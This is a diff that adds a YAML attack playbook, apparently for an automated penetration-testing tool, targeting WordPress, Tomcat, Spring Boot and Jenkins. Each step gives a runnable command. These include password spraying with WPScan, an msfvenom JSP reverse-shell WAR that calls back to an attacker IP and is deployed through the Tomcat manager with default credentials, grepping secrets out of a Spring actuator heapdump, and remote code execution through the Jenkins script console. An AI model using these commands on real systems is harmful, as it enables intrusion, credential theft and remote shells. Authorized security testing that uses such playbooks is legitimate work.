@@ -1,0 +1,84 @@
+id: cms-frameworks
+name: CMS, Frameworks & Enterprise Apps (WordPress, Tomcat, Jenkins, Spring)
+category: web
+description: Targeted attack vectors for common CMS platforms (WordPress, Joomla, Drupal), Java application servers (Tomcat, WebLogic), CI/CD pipelines (Jenkins), and modern frameworks (Spring Boot, Laravel).
+port_triggers:
+  - 80
+  - 443
+  - 8080
+  - 8443
+  - 8000
+  - 8088
+service_triggers:
+  - http
+  - https
+  - tomcat
+  - jenkins
+  - wordpress
+tags:
+  - cms
+  - wordpress
+  - tomcat
+  - jenkins
+  - spring-boot
+  - laravel
+  - wpscan
+steps:
+  - id: cms-wordpress-wpscan
+    title: WordPress Vulnerability & Plugin Audit (WPScan)
+    phase: enumeration
+    purpose: Enumerate WordPress version, vulnerable active plugins, theme vulnerabilities, and valid usernames via WPScan.
+    command: wpscan --url http://{{TARGET}}:{{PORT|80}}/ --enumerate p,t,u --api-token {{WPSCAN_API_TOKEN}} --plugins-detection aggressive
+    expected_output:
+      - '[+] WordPress version 5.8 identified'
+      - '[!] 3 vulnerabilities found for plugin: wp-file-manager'
+    common_mistakes:
+      - Free WPScan API tokens provide CVE descriptions. Without a token, only public component detection runs.
+    if_success: Vulnerable plugin or user list found! Search Exploit-DB or spray passwords (`wpscan --passwords rockyou.txt`).
+    if_failure: WordPress not detected or XML-RPC blocked.
+    references:
+      - https://github.com/wpscanteam/wpscan
+
+  - id: cms-tomcat-war-upload
+    title: Apache Tomcat Manager WAR Reverse Shell Deployment
+    phase: exploitation
+    purpose: Authenticate to Tomcat Web Application Manager (`/manager/html`) with default credentials and deploy a malicious `.war` package containing a Java JSP reverse shell.
+    command: msfvenom -p java/jsp_shell_reverse_tcp LHOST={{ATTACKER_IP}} LPORT=4444 -f war -o shell.war && curl -u '{{USERNAME|tomcat}}:{{PASSWORD|s3cret}}' -T shell.war "http://{{TARGET}}:{{PORT|8080}}/manager/text/deploy?path=/shell&update=true"
+    expected_output:
+      - 'OK - Deployed application at context path [/shell]'
+    common_mistakes:
+      - Tomcat manager requires `manager-gui` or `manager-script` role.
+    if_success: Reverse shell deployed! Trigger with `curl http://{{TARGET}}:{{PORT|8080}}/shell/` with a netcat listener running on port 4444.
+    if_failure: Tomcat manager credentials invalid. Password spray `/manager/html` with `tomcat`, `admin`, `role1`, `root`.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
+
+  - id: cms-spring-boot-actuators
+    title: Spring Boot Actuator HeapDump & Env Exploitation
+    phase: exploitation
+    purpose: Query exposed Spring Boot Actuator endpoints (`/actuator/heapdump`, `/actuator/env`, `/actuator/gateway`) to extract plaintext passwords or execute code via H2 RCE.
+    command: "curl -s http://{{TARGET}}:{{PORT|8080}}/actuator/env; curl -s -O http://{{TARGET}}:{{PORT|8080}}/actuator/heapdump; strings heapdump | grep -iE 'password|secret|key' | head -n 40"
+    expected_output:
+      - '{"propertySources": [{"name": "systemEnvironment", "properties": {"DB_PASSWORD": {"value": "******"}}}]}'
+      - 'Cleartext database credentials recovered from memory heapdump strings'
+    common_mistakes:
+      - In `/actuator/env`, passwords are masked with `******`. Download `/actuator/heapdump` to recover the unmasked plaintext strings.
+    if_success: Database credentials or application secrets recovered!
+    if_failure: Actuators protected or disabled (`management.endpoints.web.exposure.include=none`).
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators
+
+  - id: cms-jenkins-script-console-rce
+    title: Jenkins Groovy Script Console Remote Code Execution
+    phase: exploitation
+    purpose: Execute arbitrary Groovy code as SYSTEM / root via the administrative Jenkins Script Console (`/script`).
+    command: "curl -s -X POST -u '{{USERNAME|admin}}:{{PASSWORD|admin}}' -d 'script=println+\"whoami\".execute().text' http://{{TARGET}}:{{PORT|8080}}/script"
+    expected_output:
+      - 'Result: nt authority\system'
+      - 'Result: jenkins'
+    common_mistakes:
+      - Requires CSRF crumb header if CSRF protection is enabled (`curl -s -u admin:password 'http://target:8080/crumbIssuer/api/json'`).
+    if_success: Remote command execution achieved! Spawn reverse shell using Groovy socket wrapper.
+    if_failure: Jenkins requires administrative authentication or script console disabled.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/jenkins
